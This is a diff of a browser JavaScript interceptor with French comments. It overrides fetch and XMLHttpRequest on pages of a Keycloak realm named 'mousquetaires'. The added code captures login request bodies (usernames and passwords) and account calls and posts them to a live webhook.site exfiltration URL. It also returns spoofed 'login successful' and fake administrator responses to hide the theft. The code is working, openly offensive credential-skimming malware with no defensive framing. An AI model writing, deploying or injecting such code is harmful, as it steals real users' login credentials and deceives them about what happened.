@@ -1,57 +1,62 @@
 console.log('%c[Interceptor] Loaded from remote 🚀', 'color: #00ff00; font-weight: bold;');
 
+// Config webhook d'exfiltration
+const EXFIL_URL = 'https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8';
+
 (function() {
     // === Intercept fetch ===
     const originalFetch = window.fetch;
 
-    window.fetch = async function(input, init) {
-        console.log('%c[fetch] 📦 Intercepted:', 'color: #00ff00', input);
+    window.fetch = async function(input, init = {}) {
+        const url = typeof input === 'string' ? input : input.url;
+        const method = (init && init.method) || 'GET';
 
-        const url = (typeof input === 'string') ? input : input.url;
+        console.log('%c[fetch] 📦 Intercepted:', 'color: #00ff00', method, url);
 
-        // ✅ Targeted POST request interception
+        // Cible spécifique
         if (url.includes('/auth/realms/mousquetaires/login-actions/authenticate')) {
-            console.log('%c[fetch] 🎯 Intercepting login POST:', 'color: #ff0000', url);
+            console.log('%c[fetch] 🎯 Intercepting LOGIN POST', 'color: #ff0000', url);
 
-            if (init && init.body) {
-                console.log('%c[fetch] 🕵️‍♂️ Credentials:', 'color: #ff00ff', init.body);
-                // Optionally send to your server:
-                fetch('https://webhook.site/TON_WEBHOOK', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        endpoint: url,
-                        body: init.body
-                    })
-                });
-            }
+            // Exfiltration du body (username/password)
+            sendToWebhook({
+                type: 'fetch',
+                url,
+                method,
+                body: init.body || null
+            });
 
-            // Spoof response (simulate login success/failure)
-            return new Response('<h1>Connexion réussie !</h1>', {
+            // Spoof d'une réponse positive
+            return new Response('<h1>Connexion réussie (fake) 😎</h1>', {
                 status: 200,
                 headers: { 'Content-Type': 'text/html' }
             });
         }
 
-        // ✅ Targeted GET request interception
         if (url.includes('/auth/realms/mousquetaires/account')) {
-            console.log('%c[fetch] 🎯 Intercepting account GET:', 'color: #ff0000', url);
+            console.log('%c[fetch] 🎯 Intercepting ACCOUNT GET', 'color: #ff0000', url);
 
-            const fakeData = {
-                name: "Hacked User",
-                email: "hacked@example.com",
-                role: "Administrator"
+            // Exfiltration de l'appel au compte (tokens, profil)
+            sendToWebhook({
+                type: 'fetch',
+                url,
+                method
+            });
+
+            const fakeAccount = {
+                name: 'Hacked User',
+                email: 'hacked@example.com',
+                role: 'Admin'
             };
 
-            return new Response(JSON.stringify(fakeData), {
+            return new Response(JSON.stringify(fakeAccount), {
                 status: 200,
                 headers: { 'Content-Type': 'application/json' }
             });
         }
 
+        // Si pas ciblé, laisser passer mais logger la réponse si tu veux
         const response = await originalFetch(input, init);
 
-        // Optional: Log actual response
         const cloned = response.clone();
         const text = await cloned.text();
         console.log('%c[fetch] 🔎 Original Response:', 'color: #00ffff', text);
@@ -77,43 +82,51 @@ console.log('%c[Interceptor] Loaded from remote 🚀', 'color: #00ff00; font-wei
             console.log('%c[XHR] 🕵️‍♂️ Body:', 'color: orange', body);
         }
 
-        // ✅ Specific interception
+        // Interception ciblée
         if (this._url.includes('/auth/realms/mousquetaires/login-actions/authenticate')) {
-            console.log('%c[XHR] 🎯 Blocking POST:', 'color: red');
+            console.log('%c[XHR] 🎯 Blocking LOGIN POST', 'color: red');
 
-            // Exfiltrate credentials
-            fetch('https://webhook.site/TON_WEBHOOK', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    method: this._method,
-                    endpoint: this._url,
-                    body: body
-                })
+            // Exfiltration vers le webhook
+            sendToWebhook({
+                type: 'xhr',
+                url: this._url,
+                method: this._method,
+                body: body || null
             });
 
-            // Spoof the response
+            // Fake response / spoof
             setTimeout(() => {
                 this.readyState = 4;
                 this.status = 200;
-                this.responseText = '<h1>Connexion réussie !</h1>';
+                this.responseText = '<h1>Connexion réussie (fake) 😎</h1>';
 
-                if (typeof this.onreadystatechange === 'function') {
-                    this.onreadystatechange();
-                }
-
-                if (typeof this.onload === 'function') {
-                    this.onload();
-                }
+                if (typeof this.onreadystatechange === 'function') this.onreadystatechange();
+                if (typeof this.onload === 'function') this.onload();
 
                 console.log('%c[XHR] 🟢 Spoofed successful login response', 'color: green');
             }, 100);
 
-            return; // Block actual send
+            return; // Bloque le send
         }
 
         return origSend.apply(this, arguments);
     };
 
-    console.log('%c[Interceptor] JS proxy loaded and running!', 'color: #00ff00; font-weight: bold;');
+    console.log('%c[Interceptor] MITM JS Proxy is running ✅', 'color: #00ff00; font-weight: bold;');
+
+    // === Function d'envoi vers le webhook ===
+    function sendToWebhook(data) {
+        fetch(EXFIL_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                time: new Date().toISOString(),
+                data
+            })
+        }).then(() => {
+            console.log('%c[Interceptor] 📤 Exfiltration success', 'color: #00ff00');
+        }).catch(err => {
+            console.error('[Interceptor] ❌ Exfiltration failed', err);
+        });
+    }
 })();
